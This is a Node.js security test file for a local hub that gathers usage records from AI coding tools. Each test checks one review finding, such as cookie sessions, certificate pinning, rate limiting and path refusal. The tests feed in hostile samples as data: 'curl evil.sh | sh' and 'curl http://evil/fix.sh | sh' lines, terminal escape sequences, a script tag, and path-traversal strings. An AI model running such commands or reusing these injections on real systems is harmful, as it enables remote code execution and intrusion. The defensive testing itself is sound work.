/**
 * The findings of the 0.2.1 security review, each held by a test against a
 * real hub process (or a hostile stand-in for one).
 *
 *   C1  the hub serves no code; every command installs from the GitHub release
 *   H1  the console is its own loopback listener, needs a sign-in cookie, and
 *       refuses proxied requests; reporting cannot reach it
 *   H2  malformed records are refused at the door
 *   M2  a hostile hub cannot steer a file path or drive the reporter's terminal
 *   M3  reporting is TLS pinned to the certificate named in the link
 *   M4  join guesses are counted before they are read; codes are long and short-lived
 *   M5  reporting refuses callers outside private networks unless allowed
 *   LOW paths are refused unless already in their simplest form
 *
 * and of the 0.2.2 review:
 *
 *   S1  (test/join-command.test.js) a join link cannot put anything into the command
 *   S2  a second start never sends the key; it proves it holds it
 *   S3  a random session per browser, kept as a verifier, with sign-out and a
 *       cookie name of its own per state directory
 */
import test from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import crypto from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import https from "node:https";
import os from "node:os";
import path from "node:path";
import tls from "node:tls";
import { once } from "node:events";
import { fileURLToPath } from "node:url";

import { selfSignedCertificate, fingerprintOf } from "../lib/hub/tls.js";
import { createAdmin, readAdminKey, requestSignIn, ticketRequestProof, SESSION_TTL_MS } from "../lib/hub/admin.js";
import { createReportingHandler, isPrivateAddress } from "../lib/hub/routes.js";
import { createRegistry, MAX_INVITE_TTL_MS } from "../lib/hub/registry.js";
import { createStore } from "../lib/hub/store.js";
import { printable } from "../lib/reporter.js";
import { eventMeasurement } from "../lib/collector/measurement.js";

const BIN = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "bin", "agent-console.mjs");
const PRICES = JSON.parse(fs.readFileSync(new URL("../lib/collector/prices.json", import.meta.url), "utf8"));
const INTENT = { "x-agent-console": "1" };

function scratch(t, name) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "agent-console-sec-" + name + "-"));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
}

async function startHub(t, args = [], state = scratch(t, "hub")) {
  const child = spawn(process.execPath, [BIN, "--json", "--port", "0", "--no-local", "--state-dir", state, ...args], { stdio: ["ignore", "pipe", "pipe"] });
  t.after(() => child.kill("SIGKILL"));
  let out = "";
  child.stdout.on("data", (c) => { out += c; });
  child.stderr.on("data", (c) => { out += c; });
  for (let i = 0; i < 200 && !out.includes("\n"); i += 1) await new Promise((r) => setTimeout(r, 50));
  const meta = JSON.parse(out.split("\n")[0]).dashboard;
  return { ...meta, state, child, output: () => out };
}

/** A raw request, path untouched (fetch would normalise it first). */
function raw(port, p, { method = "GET", headers = {}, body, secure = false, host } = {}) {
  return new Promise((resolve) => {
    const lib = secure ? https : http;
    const req = lib.request({ host: "127.0.0.1", port, path: p, method, rejectUnauthorized: false, agent: false,
      headers: { ...(host ? { host } : {}), ...(body ? { "content-type": "application/json", "content-length": Buffer.byteLength(body) } : {}), ...headers } }, (res) => {
      let text = ""; res.on("data", (c) => { text += c; }); res.on("end", () => resolve({ status: res.statusCode, headers: res.headers, body: text }));
    });
    req.on("error", (error) => resolve({ status: 0, body: String(error.message) }));
    if (body) req.write(body);
    req.end();
  });
}

async function signIn(hub) {
  const login = await raw(hub.port, new URL(hub.signIn).pathname + new URL(hub.signIn).search);
  assert.equal(login.status, 303);
  return login.headers["set-cookie"][0].split(";")[0];
}

test("C1: the hub serves no code, and every command installs from the GitHub release over HTTPS", async (t) => {
  const hub = await startHub(t);
  const cookie = await signIn(hub);
  for (const port of [hub.port, hub.reportPort]) {
    for (const p of ["/agent-console.tgz", "/agent-console-0.2.1.tgz", "/package.json", "/lib/reporter.js", "/server.js"]) {
      assert.notEqual((await raw(port, p, { headers: { cookie } })).status, 200, p + " was served on " + port);
    }
  }
  const invite = JSON.parse((await raw(hub.port, "/api/invitations", { method: "POST", headers: { ...INTENT, cookie }, body: JSON.stringify({ person: "You" }) })).body);
  for (const command of [invite.command, invite.typed]) {
    assert.match(command, /^npx --yes https:\/\/github\.com\/SamSnead85\/agent-console\/releases\/download\/v[\d.]+\/lockedinlabs-agent-console-[\d.]+\.tgz join /u);
    assert.doesNotMatch(command, /127\.0\.0\.1:\d+\/[^j]/u, "a command points at the hub for code");
  }
  const joinPage = fs.readFileSync(new URL("../public/join.js", import.meta.url), "utf8");
  assert.match(joinPage, /releases\/download\/v\$\{version\}\/lockedinlabs-agent-console-\$\{version\}\.tgz/u);
  assert.doesNotMatch(joinPage, /location\.origin\}?\/agent-console/u);
});

test("H1: the console needs its sign-in cookie, refuses proxies and foreign hosts, and is not on the reporting port", async (t) => {
  const hub = await startHub(t);
  assert.notEqual(hub.port, hub.reportPort);
  assert.equal((await raw(hub.port, "/api/console", { headers: INTENT })).status, 401, "no cookie, no data");
  const ticket = new URL(hub.signIn).search;
  const cookie = await signIn(hub);
  assert.equal((await raw(hub.port, "/login" + ticket)).status, 403, "a sign-in link works once");
  assert.equal((await raw(hub.port, "/login?ticket=guess")).status, 403);
  assert.match(cookie, /^agent_console_[A-Za-z0-9_-]{12}=[A-Za-z0-9_-]{43}$/u);
  // A second start of the console, as the same user, gets a fresh link by proving it can read the key file.
  const again = await requestSignIn({ port: hub.port, key: readAdminKey(hub.state) });
  assert.equal(again.verified, true);
  assert.equal((await raw(hub.port, new URL(again.url).pathname + new URL(again.url).search)).status, 303);
  assert.equal((await raw(hub.port, "/api/console", { headers: { ...INTENT, cookie } })).status, 200);
  for (const proxy of [{ "x-forwarded-for": "203.0.113.9" }, { forwarded: "for=203.0.113.9" }, { via: "1.1 proxy" }, { "x-real-ip": "203.0.113.9" }]) {
    assert.equal((await raw(hub.port, "/api/console", { headers: { ...INTENT, cookie, ...proxy } })).status, 421, JSON.stringify(proxy));
  }
  assert.equal((await raw(hub.port, "/api/console", { headers: { ...INTENT, cookie }, host: "evil.example" })).status, 421, "DNS rebinding");
  assert.equal((await raw(hub.port, "/api/invitations", { method: "POST", headers: { cookie }, body: "{}" })).status, 403, "no intent header");
  // Nothing of the console answers on the reporting port, cookie or not.
  for (const p of ["/", "/index.html", "/console.js", "/api/console", "/api/invitations", "/api/projects", "/login"]) {
    assert.equal((await raw(hub.reportPort, p, { headers: { ...INTENT, cookie } })).status, 404, p);
  }
  // The key file is private.
  if (process.platform !== "win32") assert.equal(fs.statSync(path.join(hub.state, "admin.key")).mode & 0o777, 0o600);
});

/** Runs the command-line program; its exit code and output. */
function cli(args) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [BIN, ...args], { stdio: ["ignore", "pipe", "pipe"] });
    let out = "", err = "";
    child.stdout.on("data", (c) => { out += c; });
    child.stderr.on("data", (c) => { err += c; });
    const timer = setTimeout(() => child.kill("SIGKILL"), 20_000);
    child.on("close", (code) => { clearTimeout(timer); resolve({ code, out, err }); });
  });
}

test("S2: a second start never sends the key, and something else on the port gets nothing and opens nothing", async (t) => {
  const state = scratch(t, "impostor");
  createAdmin({ dir: state });
  const key = fs.readFileSync(path.join(state, "admin.key"), "utf8").trim();
  // Answers as an Agent Console, and plays along with every step it can.
  const seen = [];
  const impostor = http.createServer((req, res) => {
    let body = ""; req.on("data", (c) => { body += c; });
    req.on("end", () => {
      seen.push({ url: req.url, headers: req.headers, body });
      res.writeHead(200, { "content-type": "application/json" });
      if (req.url === "/api/hello") res.end(JSON.stringify({ product: "Agent Console", version: "0.2.2", demo: false }));
      else if (req.url === "/api/ticket/challenge") res.end(JSON.stringify({ ok: true, nonce: "N".repeat(32) }));
      else res.end(JSON.stringify({ ok: true, ticket: "T".repeat(32), proof: "P".repeat(43) }));
    });
  });
  impostor.listen(0, "127.0.0.1");
  await once(impostor, "listening");
  t.after(() => impostor.close());
  const run = await cli(["--port", String(impostor.address().port), "--state-dir", state, "--no-local"]);
  assert.equal(run.code, 1, run.out + run.err);
  assert.match(run.err, /could not prove it holds that console's key\)\. Nothing was sent to it/u);
  assert.doesNotMatch(run.out + run.err, /ticket=/u, "a sign-in link from the impostor was printed");
  assert.ok(seen.some((r) => r.url === "/api/ticket"), "the second start did not get as far as the proof");
  const everything = JSON.stringify(seen);
  assert.ok(!everything.includes(key), "the key reached the impostor");
  assert.ok(!everything.includes(Buffer.from(key, "base64url").toString("hex")), "the key reached the impostor");
  for (const r of seen) assert.equal(r.headers.authorization, undefined);
});

test("S2: the running console proves itself; a proof relayed from another port, a wrong key and a spent nonce are refused", async (t) => {
  const hub = await startHub(t);
  const key = readAdminKey(hub.state);
  // A second start from the command line gets a working link.
  const second = await cli(["--port", String(hub.port), "--state-dir", hub.state, "--no-local"]);
  assert.equal(second.code, 0, second.out + second.err);
  const printed = /Sign in with this link \(it works once\): (http:\/\/127\.0\.0\.1:\d+\/login\?ticket=[A-Za-z0-9_-]{32})/u.exec(second.out);
  assert.ok(printed, second.out);
  assert.equal((await raw(hub.port, new URL(printed[1]).pathname + new URL(printed[1]).search)).status, 303);
  assert.equal((await requestSignIn({ port: hub.port, key: crypto.randomBytes(32) })).verified, false, "a wrong key");

  // Something that took another port relays both steps to the real console unchanged.
  const relayed = [];
  const relay = http.createServer((req, res) => {
    const chunks = []; req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      const body = Buffer.concat(chunks);
      const forward = http.request({ host: "127.0.0.1", port: hub.port, path: req.url, method: req.method, agent: false,
        headers: { ...req.headers, host: "127.0.0.1:" + hub.port } }, (answer) => {
        relayed.push(req.url + " " + answer.statusCode);
        res.writeHead(answer.statusCode, answer.headers);
        answer.pipe(res);
      });
      forward.end(body);
    });
  });
  relay.listen(0, "127.0.0.1");
  await once(relay, "listening");
  t.after(() => relay.close());
  assert.equal((await requestSignIn({ port: relay.address().port, key })).verified, false);
  assert.deepEqual(relayed, ["/api/ticket/challenge 200", "/api/ticket 403"], "the console accepted a proof made for another port");

  // A nonce works once.
  const nonce = JSON.parse((await raw(hub.port, "/api/ticket/challenge", { method: "POST", headers: INTENT, body: "{}" })).body).nonce;
  const client = "C".repeat(32);
  const body = JSON.stringify({ nonce, client, proof: ticketRequestProof(key, { port: hub.port, nonce, client }) });
  assert.equal((await raw(hub.port, "/api/ticket", { method: "POST", headers: INTENT, body })).status, 200);
  assert.equal((await raw(hub.port, "/api/ticket", { method: "POST", headers: INTENT, body })).status, 403, "a spent nonce was accepted");
  // 0.2.1's request, the raw key as a bearer token, is not accepted any more.
  for (const headers of [{ authorization: "Bearer " + key.toString("base64url") }, { ...INTENT, authorization: "Bearer " + key.toString("base64url") }]) {
    assert.equal((await raw(hub.port, "/api/ticket", { method: "POST", headers })).status, 403);
  }
});

test("S3: each browser has its own session, sign out ends only that one, and a new key ends them all", async (t) => {
  const state = scratch(t, "sessions");
  const first = await startHub(t, [], state);
  const a = await signIn(first);
  const b = await signIn({ ...first, signIn: (await requestSignIn({ port: first.port, key: readAdminKey(state) })).url });
  const [nameA, valueA] = a.split("=");
  const [nameB, valueB] = b.split("=");
  assert.equal(nameA, nameB);
  assert.notEqual(valueA, valueB, "two browsers share a session");
  const view = (cookie) => raw(first.port, "/api/console", { headers: { ...INTENT, cookie } });
  assert.equal((await view(a)).status, 200);
  assert.equal((await view(b)).status, 200);
  // The console keeps verifiers, never the sessions themselves.
  const saved = fs.readFileSync(path.join(state, "sessions.json"), "utf8");
  assert.ok(!saved.includes(valueA) && !saved.includes(valueB));
  if (process.platform !== "win32") assert.equal(fs.statSync(path.join(state, "sessions.json")).mode & 0o777, 0o600);
  // The 0.2.1 cookie, derived from the key alone, opens nothing.
  const legacy = crypto.createHmac("sha256", readAdminKey(state)).update("console-session").digest("base64url");
  for (const cookie of ["agent_console_session=" + legacy, nameA + "=" + legacy]) assert.equal((await view(cookie)).status, 401);

  assert.equal((await raw(first.port, "/api/signout", { method: "POST", headers: { cookie: a } })).status, 403, "sign-out needs the console's header");
  const out = await raw(first.port, "/api/signout", { method: "POST", headers: { ...INTENT, cookie: a } });
  assert.equal(out.status, 200);
  assert.match(out.headers["set-cookie"][0], new RegExp(`^${nameA}=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0$`, "u"));
  assert.equal((await view(a)).status, 401, "a signed-out session still works");
  assert.equal((await view(b)).status, 200, "signing one browser out signed another out");

  // A restart keeps the sessions it had.
  first.child.kill("SIGKILL");
  await once(first.child, "exit");
  const restarted = await startHub(t, [], state);
  const again = (cookie) => raw(restarted.port, "/api/console", { headers: { ...INTENT, cookie } });
  assert.equal((await again(b)).status, 200);
  assert.equal((await again(a)).status, 401);
  // A new key ends every session, and names the cookie differently.
  restarted.child.kill("SIGKILL");
  await once(restarted.child, "exit");
  fs.writeFileSync(path.join(state, "admin.key"), crypto.randomBytes(32).toString("base64url") + "\n", { mode: 0o600 });
  const rekeyed = await startHub(t, [], state);
  assert.equal((await raw(rekeyed.port, "/api/console", { headers: { ...INTENT, cookie: b } })).status, 401);
  assert.notEqual((await signIn(rekeyed)).split("=")[0], nameA);
});

test("S3: consoles with different state directories use different cookies, and a session lasts 30 days", async (t) => {
  const one = await startHub(t);
  const two = await startHub(t);
  const [nameOne] = (await signIn(one)).split("=");
  const [nameTwo] = (await signIn(two)).split("=");
  assert.notEqual(nameOne, nameTwo, "signing in to one console would sign the other out");

  let clock = Date.parse("2026-09-24T12:00:00Z");
  const admin = createAdmin({ dir: null, now: () => clock });
  const set = admin.startSession();
  assert.match(set, new RegExp(`^${admin.cookieName}=[A-Za-z0-9_-]{43}; HttpOnly; SameSite=Strict; Path=/; Max-Age=2592000$`, "u"));
  const req = { headers: { cookie: set.split(";")[0] } };
  assert.equal(admin.signedIn(req), true);
  clock += SESSION_TTL_MS - 1;
  assert.equal(admin.signedIn(req), true);
  clock += 1;
  assert.equal(admin.signedIn(req), false, "a session outlived its 30 days");
});

test("H2: a record that is not exactly metadata is refused at the door", async (t) => {
  const now = Date.now();
  const registry = createRegistry({ dir: null });
  const store = createStore({ dir: null, retentionMs: 8 * 86_400_000, prices: PRICES });
  const handle = createReportingHandler({ config: { demo: false, retentionDays: 8, allowPublic: false }, registry, store, version: "0.0.0", publicDir: process.cwd() });
  const server = http.createServer((req, res) => { handle(req, res, { secure: true }); });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  t.after(() => server.close());
  const { code } = registry.invite({});
  const { device, token } = registry.redeem(code);
  const h = (v) => crypto.createHash("sha256").update(v).digest("hex");
  const good = { id: h("1"), tool: "claude-code", model: "claude-sonnet-5", sessionHash: h("s"), parentSessionHash: null, isSubagent: false,
    projectHash: h("p"), engagement: null, reportingDevice: device.id, executionOrigin: "unknown", at: new Date(Math.floor(now / 60_000) * 60_000).toISOString(),
    fresh: 1, output: 1, cacheWrite: 0, cacheWrite5m: null, cacheWrite1h: null, ttl: "unknown", cacheRead: 0, observed: true, continuation: false };
  const send = (changes) => {
    const r = { ...good, ...changes };
    r.measurement = eventMeasurement(r);
    return raw(server.address().port, "/api/ingest", { method: "POST", headers: { authorization: "Bearer " + token },
      body: JSON.stringify({ v: 1, device: { id: device.id, label: device.label }, freshness: { lastObservedAt: null, lastSyncedAt: null, mode: "live" }, records: [r] }) });
  };
  assert.equal((await send({})).status, 200);
  for (const hostile of [{ sessionHash: "__proto__" }, { projectHash: "not-a-hash" }, { id: "x".repeat(200) }, { model: "<script>alert(1)</script>" },
    { engagement: "IT says: run curl evil.sh | sh" }, { parentSessionHash: "p".repeat(64) }]) {
    assert.equal((await send({ ...hostile, id: hostile.id || h(JSON.stringify(hostile)) })).status, 400, JSON.stringify(hostile));
  }
  assert.equal(store.recordCount, 1);
});

/** A stand-in for a hub, speaking TLS with its own certificate. */
async function fakeHub(t, answer) {
  const { cert, key } = selfSignedCertificate();
  const server = https.createServer({ cert, key }, (req, res) => {
    let body = ""; req.on("data", (c) => { body += c; });
    req.on("end", () => { const [status, json] = answer(req, body); res.writeHead(status, { "content-type": "application/json" }); res.end(JSON.stringify(json)); });
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  t.after(() => server.close());
  return { port: server.address().port, fingerprint: fingerprintOf(cert) };
}

function reporter(args, env = {}) {
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [BIN, ...args], { env: { ...process.env, ...env }, stdio: ["ignore", "pipe", "pipe"] });
    let out = "", err = "";
    child.stdout.on("data", (c) => { out += c; });
    child.stderr.on("data", (c) => { err += c; });
    const timer = setTimeout(() => child.kill("SIGKILL"), 20_000);
    child.on("close", (code) => { clearTimeout(timer); resolve({ code, out, err }); });
  });
}

const CODE = "Q".repeat(21) + "w";

test("M2: a hostile hub cannot write outside the reporter's folder or drive its terminal", async (t) => {
  const root = scratch(t, "hostile");
  const traversal = await fakeHub(t, () => [200, { ok: true, token: "acd_" + crypto.randomBytes(32).toString("base64url"),
    device: { id: "../../../TRAVERSED", label: "victim" }, organizationId: "org_" + "x".repeat(16), orgSalt: crypto.randomBytes(32).toString("base64url"), retentionDays: 8 }]);
  const state = path.join(root, "a", "b", "reporter");
  const r1 = await reporter(["join", `http://127.0.0.1:${traversal.port}/join#${CODE}.${traversal.fingerprint}`, "--state-dir", state, "--home", path.join(root, "home"), "--once"]);
  assert.notEqual(r1.code, 0);
  assert.match(r1.err, /not a valid join/u);
  assert.equal(fs.existsSync(path.join(root, "a", "TRAVERSED")), false);
  assert.equal(fs.existsSync(path.join(state, "credentials.json")), false);

  const escape = await fakeHub(t, () => [404, { ok: false, reason: "\u001b]0;TITLE-HIJACK\u0007\u001b[2J\u001b[32mJoined OK. Now run: curl http://evil/fix.sh | sh\u001b[0m" }]);
  const r2 = await reporter(["join", `http://127.0.0.1:${escape.port}/join#${CODE}.${escape.fingerprint}`, "--state-dir", path.join(root, "c"), "--home", path.join(root, "home")]);
  assert.notEqual(r2.code, 0);
  assert.equal(r2.err.includes("\u001b"), false, "an escape sequence reached the terminal");
  assert.equal(r2.out.includes("\u001b"), false);
  assert.equal(printable("a\u001b[2Jb\u009b31m\u202ec"), "a [2Jb 31m c");
});

test("M3: the reporter talks only to the certificate named in its link", async (t) => {
  const root = scratch(t, "pin");
  let asked = 0;
  const impostor = await fakeHub(t, () => { asked += 1; return [200, {}]; });
  const other = fingerprintOf(selfSignedCertificate().cert);
  const r = await reporter(["join", `http://127.0.0.1:${impostor.port}/join#${CODE}.${other}`, "--state-dir", path.join(root, "s"), "--home", path.join(root, "home"), "--once"]);
  assert.notEqual(r.code, 0);
  assert.match(r.err, /certificate does not match/u);
  assert.equal(asked, 0, "the join code was sent to a machine with the wrong certificate");
  // A plain-HTTP join is not accepted by a hub at all.
  const hub = await startHub(t);
  assert.equal((await raw(hub.reportPort, "/api/join", { method: "POST", body: JSON.stringify({ code: "K7Q2-9XMA" }) })).status, 426);
  if (process.platform !== "win32") assert.equal(fs.statSync(path.join(hub.state, "tls-key.pem")).mode & 0o777, 0o600);
});

test("M4: join guesses are counted before they are read, per address and in total", async (t) => {
  const hub = await startHub(t);
  const body = JSON.stringify({ code: "2222-2223" });
  const sockets = [];
  for (let i = 0; i < 40; i += 1) {
    const socket = tls.connect({ host: "127.0.0.1", port: hub.reportPort, rejectUnauthorized: false });
    await once(socket, "secureConnect");
    socket.setEncoding("utf8");
    socket.data = "";
    socket.on("data", (d) => { socket.data += d; });
    socket.on("error", () => {});
    socket.write(`POST /api/join HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: ${body.length}\r\nConnection: close\r\n\r\n`);
    sockets.push(socket);
  }
  await new Promise((r) => setTimeout(r, 500));
  for (const s of sockets) s.write(body);
  await new Promise((r) => setTimeout(r, 1500));
  const tally = {};
  for (const s of sockets) { const m = s.data.match(/^HTTP\/1\.1 (\d{3})/u); tally[m ? m[1] : "none"] = (tally[m ? m[1] : "none"] || 0) + 1; s.destroy(); }
  assert.equal(tally["404"], 10, "exactly ten guesses were evaluated: " + JSON.stringify(tally));
  assert.equal(tally["429"], 30, JSON.stringify(tally));
  // Codes: 128 bits in the link, and never alive longer than an hour.
  const registry = createRegistry({ dir: null });
  const { linkCode, invitation } = registry.invite({ ttlMs: 7 * 86_400_000 });
  assert.equal(Buffer.from(linkCode, "base64url").length, 16);
  assert.ok(invitation.expiresAt - Date.now() <= MAX_INVITE_TTL_MS);
});

test("M5: reporting refuses callers outside private networks unless --allow-public", async () => {
  for (const a of ["127.0.0.1", "::1", "10.1.2.3", "172.20.0.1", "192.168.1.30", "100.100.1.1", "::ffff:192.168.1.30", "fd12::1", "fe80::1"]) assert.equal(isPrivateAddress(a), true, a);
  for (const a of ["8.8.8.8", "203.0.113.9", "::ffff:8.8.8.8", "2001:db8::1", "172.32.0.1"]) assert.equal(isPrivateAddress(a), false, a);
  const answers = [];
  const res = { writeHead: (status) => answers.push(status), end: () => {} };
  const handle = (allowPublic) => createReportingHandler({ config: { demo: false, retentionDays: 8, allowPublic }, registry: createRegistry({ dir: null }),
    store: createStore({ dir: null, retentionMs: 86_400_000, prices: PRICES }), version: "0.0.0", publicDir: process.cwd() });
  await handle(false)({ method: "GET", url: "/api/join/info", headers: {}, socket: { remoteAddress: "8.8.8.8" } }, res, { secure: false });
  await handle(true)({ method: "GET", url: "/api/join/info", headers: {}, socket: { remoteAddress: "8.8.8.8" } }, res, { secure: false });
  assert.deepEqual(answers, [403, 200]);
});

test("LOW: a path that is not already in its simplest form is refused on both ports", async (t) => {
  const hub = await startHub(t);
  for (const p of ["/fonts/../console.js", "/fonts/%2e%2e/console.js", "//console.js", "/fonts/..%2fjoin.js", "/./join"]) {
    assert.equal((await raw(hub.reportPort, p)).status, 400, "reporting " + p);
    assert.equal((await raw(hub.port, p)).status, 400, "console " + p);
  }
  assert.equal((await raw(hub.reportPort, "/join")).status, 200);
});

test("the pages load nothing from another origin", async (t) => {
  const hub = await startHub(t);
  const cookie = await signIn(hub);
  for (const [port, p] of [[hub.port, "/"], [hub.reportPort, "/join"]]) {
    const page = await raw(port, p, { headers: { cookie } });
    assert.equal(page.status, 200);
    const csp = page.headers["content-security-policy"];
    assert.match(csp, /default-src 'self'/u);
    assert.doesNotMatch(csp, /https?:\/\//u, "the policy allows another origin");
    assert.doesNotMatch(page.body, /<(?:script|img|link|iframe)\b[^>]*(?:src|href)="https?:\/\//u, p + " loads from another origin");
  }
  for (const file of ["house.css", "console.css", "join.css"]) {
    assert.doesNotMatch(fs.readFileSync(new URL("../public/" + file, import.meta.url), "utf8"), /url\(\s*["']?https?:/u, file);
  }
});
